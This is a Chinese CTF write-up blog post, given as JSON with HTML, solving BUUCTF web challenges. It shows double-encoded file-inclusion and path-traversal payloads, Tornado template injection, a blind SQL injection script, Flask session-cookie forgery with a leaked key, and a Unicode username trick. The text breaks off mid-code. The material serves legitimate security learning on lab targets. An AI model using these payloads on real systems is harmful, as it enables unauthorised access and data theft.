{"title":"BUUCTF 刷题(1)","slug":"BUUCTF-WP","date":"2020-04-29T06:43:09.000Z","updated":"2020-05-09T08:30:09.692Z","comments":true,"path":"api/articles/BUUCTF-WP.json","photos":[],"link":"","excerpt":null,"covers":null,"content":"<h1 id=\"BUUCTF-wp\"><a href=\"#BUUCTF-wp\" class=\"headerlink\" title=\"BUUCTF  wp\"></a>BUUCTF  wp</h1><h2 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h2><h3 id=\"Warm-up\"><a href=\"#Warm-up\" class=\"headerlink\" title=\"Warm up\"></a>Warm up</h3><p>查看源码</p>\n<pre><code> &lt;?php\n    highlight_file(__FILE__);\n    class emmm\n    {\n        public static function checkFile(&amp;$page)\n        {\n            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];\n            if (! isset($page) || !is_string($page)) {\n                echo &quot;you can&apos;t see it&quot;;\n                return false;\n            }\n\n            if (in_array($page, $whitelist)) {\n                return true;\n            }\n\n            $_page = mb_substr(\n                $page,\n                0,\n                mb_strpos($page . &apos;?&apos;, &apos;?&apos;)\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n\n            $_page = urldecode($page);\n            $_page = mb_substr(\n                $_page,\n                0,\n                mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n            echo &quot;you can&apos;t see it&quot;;\n            return false;\n        }\n    }\n\n    if (! empty($_REQUEST[&apos;file&apos;])\n        &amp;&amp; is_string($_REQUEST[&apos;file&apos;])\n        &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;])\n    ) {\n        include $_REQUEST[&apos;file&apos;];\n        exit;\n    } else {\n        echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;;\n    }  \n?&gt; </code></pre><p>存在 <code>phpmyadmin 4.8.1</code> 远程文件包含漏洞 <code>cve-2018-12613</code></p>\n<blockquote>\n<p>mb_strpos — 查找字符串在另一个字符串中首次出现的位置</p>\n<p>mb_substr — 获取部分字符串</p>\n</blockquote>\n<p>因为考虑到 <code>file</code> 可能带参数的问题所以先进行了一次 <code>mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</code> ，如果这里接下来的判断通过则直接返回 <code>true</code> 。如果失败则对返回的结果进行一次 <code>urldecode</code> ，我们知道浏览器会自动将传输的数据进行一次解码，所以我们传入二次编码的 <code>?-&gt;%253F</code> 之后会经过两次解码得到 <code>?</code> ,从而使返回 <code>true</code> .在 <code>checkfile</code> 返回 <code>true</code> 之后我们就有了目录穿越包含文件。</p>\n<p>我们有两种方法:</p>\n<pre><code>?file=hint.php?../../../../../ffffllllaaaagggg\nfile=hint.php%253f../../../../../ffffllllaaaagggg</code></pre><h2 id=\"easy-tornado\"><a href=\"#easy-tornado\" class=\"headerlink\" title=\"easy_tornado\"></a>easy_tornado</h2><p>打开页面发现三个链接，内容如下</p>\n<pre><code>/flag.txt                //flag in /fllllllllllllag\n/welcome.txt            //render\n/hints.txt                //md5(cookie_secret+md5(filename))</code></pre><p>应该是模板注入，而且需要 cookie_secret .抓包并没有抓到 cookie </p>\n<p>观察链接： <code>file?filename=/flag.txt&amp;filehash=07c1e7d13389a10b75c75c9884c867fb</code> 我们直接访问/fllllllllllllag 报错 <code>/error?msg=Error</code> ，在error 这里尝试 SSTI： <code>error?msg=1</code> 可以执行静态表达式，但是不能做运算。</p>\n<p>在Tornado的前端页面模板中，Tornado提供了一些对象别名来快速访问对象</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span> &lt;title&gt;</span><br><span class=\"line\"><span class=\"number\">2</span>     &#123;&#123; escape(handler.settings[<span class=\"string\">\"blog_title\"</span>]) &#125;&#125;</span><br><span class=\"line\">3 &lt;/title&gt;</span><br></pre></td></tr></table></figure>\n\n<p>但是奇怪的是RequestHandler中并没有settings这个属性，与RequestHandler关联的Application对象（Requestion.application）才有setting这个属性！后来重新翻了一下文档，发现又是一个别名。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">RequestHandler.settings</span><br><span class=\"line\"></span><br><span class=\"line\">An alias <span class=\"keyword\">for</span> self.application.settings.</span><br></pre></td></tr></table></figure>\n\n<p>handler 指向RequestHandler</p>\n<p>而RequestHandler.settings又指向self.application.settings</p>\n<p>所有handler.settings就指向RequestHandler.application.settings了！</p>\n<p>所以当我们访问 <code>RequestHandler.application.settings</code> 失败时，我们访问 <code>handler.settings</code> 得到 <code>secret_key</code> ,之后使用脚本进行 md5加密之后访问即可：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> hashli</span><br><span class=\"line\">​\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">md5value</span><span class=\"params\">(s)</span>:</span></span><br><span class=\"line\">​\t    md5 = hashlib.md5()</span><br><span class=\"line\">​\t    md5.update(s.encode())</span><br><span class=\"line\">​\t    <span class=\"keyword\">return</span> md5.hexdigest()</span><br><span class=\"line\">\t</span><br><span class=\"line\">​\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">mdfive2</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">​\t    filename = <span class=\"string\">'/fllllllllllllag'</span></span><br><span class=\"line\">​\t    cookie = <span class=\"string\">r\"M)Z.&gt;&#125;&#123;O]lYIp(oW7$dc132uDaK&lt;C%wqj@PA![VtR#geh9UHsbnL_+mT5N~J84*r\"</span></span><br><span class=\"line\">​\t    <span class=\"comment\">#print(md5value(filename))</span></span><br><span class=\"line\">​\t    <span class=\"comment\"># print(md5value('*c].)Y!x&lt;kr1e2_oQ(zO6Xd5D9ZKw7IPCs#4h~R-JFa3Vp8B0N&gt;%+WgjHbvfM@[U'))</span></span><br><span class=\"line\">​\t    <span class=\"comment\"># print(''+md5value(filename))</span></span><br><span class=\"line\">​\t    print(md5value(cookie + md5value(filename)))<span class=\"comment\">#hints md5(cookie_secret+md5(filename))</span></span><br><span class=\"line\">​\tmdfive2()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"CISCN-hack-world\"><a href=\"#CISCN-hack-world\" class=\"headerlink\" title=\"CISCN-hack_world\"></a>CISCN-hack_world</h2><p>进入靶机，看到：</p>\n<pre><code>All You Want Is In Table &apos;flag&apos; and the column is &apos;flag&apos;\nNow, just give the id of passage</code></pre><p>输入0，1，2 分别有不同回显，输入部分关键字显示 <code>bool(false)</code> ,应该是布尔盲注。在bp里FUZZ，<code>or、and、/*、union、空格</code>等都被过滤了。</p>\n<p>直接 <code>select flag from flag</code> 查询被过滤，绕过空格可以用括号 <code>select(flag)from(flag)</code> </p>\n<p>用二分法猜解名字</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">'http://be659fb8-1739-4a9f-9f9e-8e2be1e33ce6.node3.buuoj.cn/index.php'</span></span><br><span class=\"line\">data = &#123;<span class=\"string\">\"id\"</span>:<span class=\"string\">\"\"</span>&#125;</span><br><span class=\"line\">flag = <span class=\"string\">'flag&#123;'</span></span><br><span class=\"line\"></span><br><span class=\"line\">i = <span class=\"number\">6</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">    begin = <span class=\"number\">32</span></span><br><span class=\"line\">    end = <span class=\"number\">126</span></span><br><span class=\"line\">    tmp = (begin+end)//<span class=\"number\">2</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> begin&lt;end:</span><br><span class=\"line\">        print(begin,tmp,end)</span><br><span class=\"line\">        time.sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">        data[<span class=\"string\">\"id\"</span>] = <span class=\"string\">\"if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,2)\"</span>.format(i,tmp)</span><br><span class=\"line\">        r = requests.post(url,data=data)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">'Hello'</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">            begin = tmp+<span class=\"number\">1</span></span><br><span class=\"line\">            tmp = (begin+end)//<span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            end = tmp</span><br><span class=\"line\">            tmp = (begin+end)//<span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">    flag+=chr(tmp)</span><br><span class=\"line\">    print(flag)</span><br><span class=\"line\">    i+=<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> flag[<span class=\"number\">-1</span>]==<span class=\"string\">'&#125;'</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"HCTF-admin\"><a href=\"#HCTF-admin\" class=\"headerlink\" title=\"HCTF admin\"></a>HCTF admin</h2><p>11/6/2019 8:43:40 PM </p>\n<h3 id=\"flask-session-伪造\"><a href=\"#flask-session-伪造\" class=\"headerlink\" title=\"flask-session 伪造\"></a>flask-session 伪造</h3><p>从源码得到提示下载到了源码</p>\n<p>贴一部分代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">index.html</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;% if current_user.is_authenticated and session['name'] == 'admin' %&#125;</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">class</span>=<span class=\"string\">\"nav\"</span>&gt;</span>hctf&#123;xxxxxxxxx&#125;<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">&#123;% endif %&#125;</span><br><span class=\"line\"><span class=\"comment\">&lt;!-- you are not admin --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">class</span>=<span class=\"string\">\"nav\"</span>&gt;</span>Welcome to hctf<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">config.py</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Config</span><span class=\"params\">(object)</span>:</span></span><br><span class=\"line\">    SECRET_KEY = os.environ.get(<span class=\"string\">'SECRET_KEY'</span>) <span class=\"keyword\">or</span> <span class=\"string\">'ckj123'</span></span><br><span class=\"line\">    SQLALCHEMY_DATABASE_URI = <span class=\"string\">'mysql+pymysql://root:adsl1234@db:3306/test'</span></span><br><span class=\"line\">    SQLALCHEMY_TRACK_MODIFICATIONS = <span class=\"literal\">True</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">routes.py/change</span><br><span class=\"line\">​\t</span><br><span class=\"line\"><span class=\"meta\">\t@app.route('/change', methods = ['GET', 'POST'])</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">change</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\t    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> current_user.is_authenticated:</span><br><span class=\"line\">\t        <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">'login'</span>))</span><br><span class=\"line\">\t    form = NewpasswordForm()</span><br><span class=\"line\">\t    <span class=\"keyword\">if</span> request.method == <span class=\"string\">'POST'</span>:</span><br><span class=\"line\">\t        name = strlower(session[<span class=\"string\">'name'</span>])</span><br><span class=\"line\">\t        user = User.query.filter_by(username=name).first()</span><br><span class=\"line\">\t        user.set_password(form.newpassword.data)</span><br><span class=\"line\">\t        db.session.commit()</span><br><span class=\"line\">\t        flash(<span class=\"string\">'change successful'</span>)</span><br><span class=\"line\">\t        <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">'index'</span>))</span><br><span class=\"line\">\t    <span class=\"keyword\">return</span> render_template(<span class=\"string\">'change.html'</span>, title = <span class=\"string\">'change'</span>, form = form)</span><br></pre></td></tr></table></figure>\n\n<p>可以看到用 admin 账户登陆即可得到 flag，这里涉及到了 flask session 伪造，简单搜索我们可以很容易搜到p神的 session<br>解密脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python3</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> zlib</span><br><span class=\"line\"><span class=\"keyword\">from</span> base64 <span class=\"keyword\">import</span> b64decode</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask.sessions <span class=\"keyword\">import</span> session_json_serializer</span><br><span class=\"line\"><span class=\"keyword\">from</span> itsdangerous <span class=\"keyword\">import</span> base64_decode</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">decryption</span><span class=\"params\">(payload)</span>:</span></span><br><span class=\"line\">    payload, sig = payload.rsplit(<span class=\"string\">b'.'</span>, <span class=\"number\">1</span>)</span><br><span class=\"line\">    payload, timestamp = payload.rsplit(<span class=\"string\">b'.'</span>, <span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    decompress = <span class=\"literal\">False</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> payload.startswith(<span class=\"string\">b'.'</span>):</span><br><span class=\"line\">        payload = payload[<span class=\"number\">1</span>:]</span><br><span class=\"line\">        decompress = <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        payload = base64_decode(payload)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"keyword\">raise</span> Exception(<span class=\"string\">'Could not base64 decode the payload because of '</span></span><br><span class=\"line\">                         <span class=\"string\">'an exception'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> decompress:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            payload = zlib.decompress(payload)</span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"keyword\">raise</span> Exception(<span class=\"string\">'Could not zlib decompress the payload before '</span></span><br><span class=\"line\">                             <span class=\"string\">'decoding the payload'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> session_json_serializer.loads(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    print(decryption(sys.argv[<span class=\"number\">1</span>].encode()))</span><br></pre></td></tr></table></figure>\n\n<p>先注册一个普通账号进行登陆，得到cookie，经过脚本解密 <code>python3 py3-flask_session_decode.py cookie</code> 得到：</p>\n<pre><code>{\n&apos;_fresh&apos;: True, \n&apos;_id&apos;:b&apos;bbf3746b9cd211acd60600a7d24fc55c2dcf65c790142d9b984e1d\n954d61201b76dbcc4c5221672ce13679718528b34f3f45b7afc79b6384c9b8\ne7168aa6e8f3&apos;, \n&apos;csrf_token&apos;: b&apos;b7b7b2574958167d3670aa0e5bf46e47b60d1e39&apos;, \n&apos;image&apos;: b&apos;TmDp&apos;, \n&apos;name&apos;: &apos;goya&apos;, \n&apos;user_id&apos;: &apos;10&apos;\n}</code></pre><p>通过源码我们看到这句话 <code>SECRET_KEY = os.environ.get(&#39;SECRET_KEY&#39;) or &#39;ckj123&#39;</code> ，其中 <code>environ</code> 是一个字符串所对应环境的映像对象，例如 </p>\n<pre><code>&gt;&gt;&gt; os.environ[&apos;TEMP&apos;]\n&apos;C:\\\\Users\\\\*****\\\\AppData\\\\Local\\\\Temp&apos;</code></pre><p>当获取不到 <code>SECRET_KEY</code> 时就使用 <code>ckj123</code> 作为密钥，这里我们不确定是不是能获取到环境变量里的key，但是我们用 ckj123 先进行测试。</p>\n<p>利用搜到的脚本 <a href=\"https://github.com/noraj/flask-session-cookie-manager\">https://github.com/noraj/flask-session-cookie-manager</a> 修改 <code>name</code> 为 <code>admin</code> 来生成伪造的cookie：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python2 flask_session_cookie_manager2.py encode -s <span class=\"string\">\"ckj123\"</span> -t <span class=\"string\">\"&#123;'_fresh': True, '_id': b'bbf3746b9cd211acd60600a7d24fc55c2dcf65c790142d9b984e1d954d61201b76dbcc4c5221672ce13679718528b34f3f45b7afc79b6384c9b8e7168aa6e8f3', 'csrf_token': b'b7b7b2574958167d3670aa0e5bf46e47b60d1e39', 'image': b'TmDp', 'name': 'admin', 'user_id': '10'&#125;\"</span></span><br></pre></td></tr></table></figure>\n\n<p>生成新 cookie：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.eJxNkEGPgjAQhf_KpmcPWPBC4kFSIZDMEE2xaS-ERQQKdRPUKBj_<span class=\"number\">-1</span>Y3WT1NMm_me2_mTvLDUJ0a4p-HSzUjebsn_p18fROfSJMYmEoHTbyQdDMCDxtbKTB5hWjtKhY7ysAcBYwqQoN6p3HqrsA3o2J9m_LaUTzsUp45iskb6NVN6pKqKNFy2mrksWVKFwz2wIHaXRd4PQfdtDBtDVDpoIhdKZTl9i1q8DCChdRNj9OaplHYoMk8pWFJHjNSnoZDfv7pquP7BL1vkcYj8tKxMbynnWJPq6CRPOhRJAaZ6pHZOR10ILIp3SxfuNYUdfVP2kXzdbn6U46FeQtSbM-F8F7C5VQNnx8EvrL9xy8gAnGJ.XcK0Ow<span class=\"number\">.1</span>V55Ih_Ip48Y5fgVUgbSNrQlWyU</span><br></pre></td></tr></table></figure>\n\n<p>此时我们替换已经登陆账号的 cookie 即可得到flag</p>\n<h3 id=\"unicode欺骗\"><a href=\"#unicode欺骗\" class=\"headerlink\" title=\"unicode欺骗\"></a>unicode欺骗</h3><p>看WP看到的另一种方法，挺有意思</p>\n<p>观察路由处的代码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@app.route('/register', methods = ['GET', 'POST'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">register</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> current_user.is_authenticated:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">'index'</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">    form = RegisterForm()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.method == <span class=\"string\">'POST'</span>:</span><br><span class=\"line\">        **name = strlower(form.username.data)**</span><br><span class=\"line\">        <span class=\"keyword\">if</span> session.get(<span class=\"string\">'image'</span>).lower() != form.verify_code.data.lower():</span><br><span class=\"line\">            flash(<span class=\"string\">'Wrong verify code.'</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> render_template(<span class=\"string\">'register.html'</span>, title = <span class=\"string\">'register'</span>, form=form)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> User.query.filter_by(username = name).first():</span><br><span class=\"line\">            flash(<span class=\"string\">'The username has been registered'</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">'register'</span>))</span><br><span class=\"line\">        user = User(username=name)</span><br><span class=\"line\">        user.set_password(form.password.data)</span><br><span class=\"line\">        db.session.add(user)</span><br><span class=\"line\">        db.session.commit()</span><br><span class=\"line\">        flash(<span class=\"string\">'register successful'</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">'login'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">'register.html'</span>, title = <span class=\"string\">'register'</span>, form = form)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route('/login', methods = ['GET', 'POST'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">login</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> current_user.is_authenticated:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">'index'</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">    form = LoginForm()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.method == <span class=\"string\">'POST'</span>:</span><br><span class=\"line\">        **name = strlower(form.username.data)**</span><br><span class=\"line\">        session[<span class=\"string\">'name'</span>] = name</span><br><span class=\"line\">        user = User.query.filter_by(username=name).first()</span><br><span class=\"line\">        <span class=\"keyword\">if</span> user <span class=\"keyword\">is</span> <span class=\"literal\">None</span> <span class=\"keyword\">or</span> <span class=\"keyword\">not</span> user.check_password(form.password.data):</span><br><span class=\"line\">            flash(<span class=\"string\">'Invalid username or password'</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">'login'</span>))</span><br><span class=\"line\">        login_user(user, remember=form.remember_me.data)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">'index'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">'login.html'</span>, title = <span class=\"string\">'login'</span>, form = form)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route('/change', methods = ['GET', 'POST'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">change</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> current_user.is_authenticated:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">'login'</span>))</span><br><span class=\"line\">    form = NewpasswordForm()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.method == <span class=\"string\">'POST'</span>:</span><br><span class=\"line\">        **name = strlower(session[<span class=\"string\">'name'</span>])**</span><br><span class=\"line\">        user = User.query.filter_by(username=name).first()</span><br><span class=\"line\">        user.set_password(form.newpassword.data)</span><br><span class=\"line\">        db.session.commit()</span><br><span class=\"line\">        flash(<span class=\"string\">'change successful'</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">'index'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">'change.html'</span>, title = <span class=\"string\">'change'</span>, form = form)</span><br></pre></td></tr></table></figure>\n\n<p>python 已经有了自己的 lower() 函数不用，用了自己定义的 strlower() ，进到这个函数：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">strlower</span><span class=\"params\">(username)</span>:</span></span><br><span class=\"line\">    username = nodeprep.prepare(username)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> username</span><br></pre></td></tr></table></figure>\n\n<p>可以看到 <code>from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep</code> 这个函数来自 twisted ,而题目中 <code>Twisted==10.2.0</code> ,版本差距有点大。</p>\n<p>对于一些字符，<a href=\"https://unicode-table.com/en/search/?q=small+capital\" target=\"_blank\" rel=\"noopener\">https://unicode-table.com/en/search/?q=small+capital</a> 这个函数的作用就是</p>\n<pre><code>ᴀ -&gt; A -&gt; a</code></pre><p>我们在上面的网站上找到一个 <code>ā</code> ，然后注册 <code>ādmin</code> ,此时经过一次 <code>strlower()</code> 变为 <code>ADMIN</code> ，之后我们登陆 <code>ADMIN</code> ，再经过一次 <code>strlower()</code> 就成为了 <code>admin</code> 。</p>\n<h3 id=\"条件竞争\"><a href=\"#条件竞争\" class=\"headerlink\" title=\"条件竞争\"></a>条件竞争</h3><p>先注册一个用户然后开一个线程改密码，另一个线程使用 admin 登陆，在某一瞬间生成 admin 的session 时我们改密码的操作也到了，这时就可以修改密码了</p>\n<figure class=\"highlight python\"><table><tr><td 